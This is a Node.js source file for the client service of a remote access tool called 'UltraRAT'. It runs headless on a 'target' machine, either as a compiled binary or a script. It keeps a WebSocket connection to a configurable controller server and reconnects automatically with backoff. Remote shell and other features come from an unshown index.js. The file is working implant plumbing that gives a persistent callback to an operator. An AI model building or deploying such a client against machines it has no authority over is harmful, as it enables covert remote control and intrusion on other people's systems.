'use strict';

/**
 * service.js — Headless service entry point for UltraRAT client.
 *
 * DESIGN PRINCIPLE: This file is intentionally a thin connection manager.
 * All RAT features (shell, chat, broadcast, new commands, etc.) live in
 * index.js / RemoteClient. Adding features there automatically works here.
 *
 * Works in three modes:
 *   1. Compiled binary (pkg)  → node service.js is NOT needed on target
 *   2. node service.js        → requires Node.js on target
 *   3. npm run service        → same as above, for dev
 *
 * Config resolution order:
 *   a. RAT_SERVER_URL environment variable (highest priority)
 *   b. config.json next to the binary / script (editable without rebuild)
 *   c. Built-in defaults
 */

const fs   = require('fs');
const path = require('path');
const RemoteClient = require('./index.js');
const logger = require('./logger.js');

// ── pkg detection ─────────────────────────────────────────────────────────────
// When bundled by pkg, process.pkg is defined and __dirname is inside the
// read-only snapshot. We must read mutable files (config.json) from the
// directory that actually contains the .exe / linux binary instead.
const IS_PKG  = typeof process.pkg !== 'undefined';
const BASE_DIR = IS_PKG ? path.dirname(process.execPath) : __dirname;

// ── Config ────────────────────────────────────────────────────────────────────

let cfg = {};
try {
  cfg = JSON.parse(fs.readFileSync(path.join(BASE_DIR, 'config.json'), 'utf8'));
} catch (_) {
  // config.json not found next to binary — using built-in defaults
}

const SERVER_URL = process.env.RAT_SERVER_URL || cfg.serverUrl || 'ws://localhost:3000';
const RECONNECT_CFG = cfg.reconnect || {};
const INITIAL_DELAY  = RECONNECT_CFG.initialDelay || 2000;   // ms
const MAX_DELAY      = RECONNECT_CFG.maxDelay     || 60000;  // ms
const MULTIPLIER     = RECONNECT_CFG.multiplier   || 2;

// ── State ─────────────────────────────────────────────────────────────────────

let reconnectDelay = INITIAL_DELAY;
let activeClient   = null;
let shuttingDown   = false;

// ── Connection loop ───────────────────────────────────────────────────────────

function startClient() {
  if (shuttingDown) return;

  logger.info(`Connecting to ${SERVER_URL} ...`);

  const client = new RemoteClient(SERVER_URL);
  activeClient = client;

  client
    .connect()
    .then(() => {
      // Reset backoff after a successful connection
      reconnectDelay = INITIAL_DELAY;
      logger.info(`Connected. Client ID will be assigned by server.`);

      // Hook into the underlying WebSocket close event so we can schedule
      // a reconnect without touching RemoteClient internals.
      client.ws.once('close', () => {
        if (shuttingDown) return;
        logger.warn(`Connection closed. Reconnecting in ${reconnectDelay / 1000}s ...`);
        scheduleReconnect();
      });
    })
    .catch((err) => {
      logger.error(`Connection failed: ${err.message}`);
      scheduleReconnect();
    });
}

function scheduleReconnect() {
  if (shuttingDown) return;
  setTimeout(() => {
    reconnectDelay = Math.min(reconnectDelay * MULTIPLIER, MAX_DELAY);
    startClient();
  }, reconnectDelay);
}

// ── Graceful shutdown ─────────────────────────────────────────────────────────

function shutdown(signal) {
  logger.info(`${signal} received — shutting down gracefully.`);
  shuttingDown = true;
  if (activeClient) {
    try { activeClient.disconnect(); } catch (_) {}
  }
  process.exit(0);
}

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));

// Catch unhandled errors so the service doesn't die silently without a log
process.on('uncaughtException', (err) => {
  logger.error(`Uncaught exception: ${err.message}`);
  logger.error(err.stack || '');
  // Let the service manager restart us
  process.exit(1);
});

process.on('unhandledRejection', (reason) => {
  logger.error(`Unhandled rejection: ${reason}`);
});

// ── Start ─────────────────────────────────────────────────────────────────────

logger.info('═══════════════════════════════════════');
logger.info(' UltraRAT Client Service starting up   ');
logger.info(`  Server   : ${SERVER_URL}`);
logger.info(`  Log file : ${logger.logFile}`);
logger.info('═══════════════════════════════════════');

startClient();
